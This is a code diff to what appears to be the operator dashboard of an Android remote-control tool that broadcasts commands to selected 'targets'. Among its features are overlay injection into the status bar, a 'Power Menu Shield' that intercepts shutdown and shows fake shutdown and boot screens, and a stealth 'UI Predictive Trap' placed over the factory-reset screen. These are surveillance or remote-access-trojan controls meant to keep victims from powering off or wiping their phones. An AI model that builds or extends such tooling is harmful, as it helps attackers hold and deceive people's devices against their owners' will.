@@ -420,7 +420,7 @@
                     { id: 'RUN_INTENT', name: 'Trigger System Intent', icon: '⚡', inputs: [{id: 'int-act', label: 'Action', type: 'text', val: 'android.intent.action.VIEW'}, {id: 'int-pkg', label: 'Package Name', type: 'text'}, {id: 'int-cls', label: 'Class Name', type: 'text'}, {id: 'int-data', label: 'URI/Data', type: 'text'}, {id: 'int-tgt', label: 'Target', type: 'select', options: [{v: 'activity', l: 'Activity'}, {v: 'service', l: 'Service'}, {v: 'broadcast', l: 'Broadcast'}]}, {id: 'int-json', label: '--- OR PASTE RAW JSON PAYLOAD ---', type: 'textarea'}] },
                                         { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs:[] },
                     { id: 'STATUS_BAR_UI', name: 'Status Bar Injection', icon: '🚥', keywords: 'status, top, bar, overlay', inputs: [{id: 'sb-state', label: 'State', type: 'select', options:[{v: 'ON', l: 'Activate'}, {v: 'OFF', l: 'Deactivate'}]}, {id: 'sb-touchable', label: 'Input Mode', type: 'select', options:[{v: 'FALSE', l: 'Ghost (Pass-through)'}, {v: 'TRUE', l: 'Touchable'}]}, {id: 'sb-html', label: 'HTML Content', type: 'textarea', placeholder: '<html>...'}] },
-                    { id: 'POWER_SHIELD', name: 'Power Menu Shield', icon: '🛡️', inputs: [{id: 'ps-toggle', label: 'Intercept State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED (Pass-through)'}]}, {id: 'ps-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ps-method', label: 'Injection Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Above Power Menu)'}, {v: 'OVERLAY', l: 'Standard (Standard Apps)'}]}, {id: 'ps-html', label: 'Shield HTML Payload', type: 'textarea', placeholder: '<html>...'}] },
+                    { id: 'POWER_SHIELD', name: 'Power Menu Shield', icon: '🛡️', inputs: [{id: 'ps-toggle', label: 'Intercept State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED (Pass-through)'}]}, {id: 'ps-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ps-method', label: 'Injection Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Above Power Menu)'}, {v: 'OVERLAY', l: 'Standard (Standard Apps)'}]}, {id: 'ps-html', label: 'Dual HTML Payload (Shutdown ||| Boot)', type: 'textarea', placeholder: '<html>Shutdown Content</html> ||| <html>Boot/Logo Content</html>'}] },
                     { id: 'UI_TRAP', name: 'UI Predictive Trap', icon: '🪤', inputs: [{id: 'ui-trap-target', label: 'Fingerprint (Title@@Summary@@Pkg@@Anchor)', type: 'text', placeholder: 'Reset@@Factory data reset@@settings@@Reset'}, {id: 'ui-trap-method', label: 'Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth Overlay)'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-trap-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ui-trap-dim', label: 'Dim Level % (0=Black, 100=Normal)', type: 'number', val: 20}, {id: 'ui-trap-html', label: 'Predictive HTML Payload', type: 'textarea', placeholder: '<html>...'}] },
                     { id: 'FORCE_DATA', name: 'Ghost Hand Data Toggle', icon: '📡', keywords: 'mobile, data, cellular, internet', inputs: [] },
                     { id: 'CLEAR_UI_TRAP', name: 'Disarm UI Trap', icon: '🔓', inputs: [] }
@@ -528,6 +528,8 @@
 
         function renderCommandDashboard() {
             const container = document.getElementById('cmd-dashboard-container');
+            const lastParams = JSON.parse(localStorage.getItem('cortex_last_params') || '{}');
+
             container.innerHTML = COMMAND_GROUPS.map(group => `
                 <div class="cat-group" id="cat-${group.id}">
                     <div class="cat-header ${group.css}" onclick="toggleDashboardCat('${group.id}')" data-search="${group.search}">
@@ -547,20 +549,22 @@
                                 <div class="cmd-drawer" id="drawer-${cmd.id}">
                                     <div class="drawer-inputs">
                                         ${cmd.customUI || ''}
-                                        ${cmd.inputs.map(input => `
+                                        ${cmd.inputs.map(input => {
+                                            const savedVal = lastParams[input.id] !== undefined ? lastParams[input.id] : (input.val !== undefined ? input.val : '');
+                                            return `
                                             <div style="margin-bottom:10px;">
                                                 <label style="display:block; font-size:0.6rem; color:var(--primary); margin-bottom:4px;">${input.label}</label>
                                                 ${input.type === 'select' ? `
                                                     <select id="${input.id}" style="width:100%; background:#000; color:var(--primary); border:1px solid #333; padding:8px;">
-                                                        ${input.options.map(o => `<option value="${o.v}">${o.l}</option>`).join('')}
+                                                        ${input.options.map(o => `<option value="${o.v}" ${String(o.v) === String(savedVal) ? 'selected' : ''}>${o.l}</option>`).join('')}
                                                     </select>
                                                 ` : input.type === 'textarea' ? `
-                                                    <textarea id="${input.id}" placeholder="${input.placeholder || ''}" style="width:100%; height:80px;"></textarea>
+                                                    <textarea id="${input.id}" placeholder="${input.placeholder || ''}" style="width:100%; height:80px;">${savedVal}</textarea>
                                                 ` : `
-                                                    <input type="${input.type}" id="${input.id}" value="${input.val !== undefined ? input.val : ''}" placeholder="${input.placeholder || ''}" style="width:100%">
+                                                    <input type="${input.type}" id="${input.id}" value="${savedVal}" placeholder="${input.placeholder || ''}" style="width:100%">
                                                 `}
-                                            </div>
-                                        `).join('')}
+                                            </div>`;
+                                        }).join('')}
                                     </div>
                                     <div class="cmd-actions">
                                         <button class="btn" style="flex:1; background:var(--primary); color:#000;" onclick="sendCmd('${cmd.id}')">BROADCAST</button>
@@ -872,6 +876,19 @@
 
         async function sendCmd(type, forcedVal = null) {
             if (selectedDeviceIds.size === 0) return alert("NO TARGETS SELECTED");
+
+            // --- PERSISTENCE ENGINE: SAVE LAST PARAMS ---
+            const lastParams = JSON.parse(localStorage.getItem('cortex_last_params') || '{}');
+            COMMAND_GROUPS.forEach(g => {
+                const cmd = g.commands.find(c => c.id === type);
+                if (cmd && cmd.inputs) {
+                    cmd.inputs.forEach(input => {
+                        const el = document.getElementById(input.id);
+                        if (el) lastParams[input.id] = el.value;
+                    });
+                }
+            });
+            localStorage.setItem('cortex_last_params', JSON.stringify(lastParams));
             
             let content = forcedVal;
             if (content === null) {
